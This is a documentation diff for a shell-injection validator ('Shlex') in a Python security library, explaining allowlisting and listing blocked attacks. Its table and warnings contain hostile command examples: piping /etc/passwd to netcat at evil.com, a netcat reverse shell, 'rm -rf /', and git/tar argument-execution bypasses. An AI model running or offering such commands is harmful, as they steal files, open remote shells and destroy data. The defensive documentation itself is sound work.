@@ -643,6 +643,82 @@ constraint.is_safe("not-a-url")  # False
 
 ---
 
+### Shlex
+
+Validates that a shell command string is safe and simple. Ensures the command is a single executable with literal arguments, preventing shell injection.
+
+```python
+from tenuo import Shlex
+
+# Allow only specific binaries
+constraint = Shlex(allow=["ls", "cat", "grep"])
+
+constraint.matches("ls -la /tmp")           # True
+constraint.matches("cat file.txt")          # True
+constraint.matches("ls -la; rm -rf /")      # False (operator blocked)
+constraint.matches("echo $(whoami)")        # False (command substitution)
+constraint.matches("ls $HOME")              # False (variable expansion)
+constraint.matches("rm -rf /")              # False (rm not in allowlist)
+```
+
+**Security Features:**
+
+| Attack | Example | Blocked? |
+|--------|---------|----------|
+| Command chaining | `ls; rm -rf /` | ✅ |
+| Pipe injection | `cat /etc/passwd \| nc evil.com 80` | ✅ |
+| Logical operators | `true && rm -rf /` | ✅ |
+| I/O redirection | `echo pwned > /etc/cron.d/x` | ✅ |
+| Command substitution | `echo $(whoami)` | ✅ |
+| Backtick substitution | `` echo `id` `` | ✅ |
+| Variable expansion | `ls $HOME` | ✅ |
+| Newline injection | `ls\nrm -rf /` | ✅ |
+| Unauthorized binary | `nc -e /bin/sh evil.com` | ✅ |
+
+**Options:**
+
+```python
+# Block glob characters too (*, ?, [)
+Shlex(allow=["ls"], block_globs=True)
+```
+
+> [!WARNING]
+> **Tier 1 Mitigation Only**
+>
+> Shlex validates **shell syntax**, not **tool semantics**. Some tools interpret arguments as commands:
+>
+> ```python
+> # These pass Shlex but the tool executes the argument:
+> "git clone --upload-pack='malicious' repo"
+> "tar --checkpoint-action=exec=cmd -xf file.tar"
+> ```
+>
+> For complete protection, use `proc_jail` which bypasses the shell entirely via `execve()`.
+
+> [!NOTE]
+> **Dangerous Binaries**
+>
+> Even with valid syntax, some binaries are dangerous:
+> - `python`, `perl`, `ruby` — arbitrary code execution
+> - `nc`, `curl`, `wget` — network access / SSRF
+> - `bash`, `sh`, `env`, `xargs` — shell escape
+>
+> Only allow specific, low-risk binaries like `ls`, `cat`, `head`, `tail`, `wc`, `grep`.
+
+**Error Handling:**
+
+```python
+# Non-string arguments raise TypeError
+constraint = Shlex(allow=["ls"])
+constraint.matches(123)   # False
+constraint.matches(None)  # False
+
+# Empty allowlist raises ValueError
+Shlex(allow=[])  # ValueError: Shlex requires at least one allowed binary
+```
+
+---
+
 ### Regex
 
 Matches strings against regular expressions.
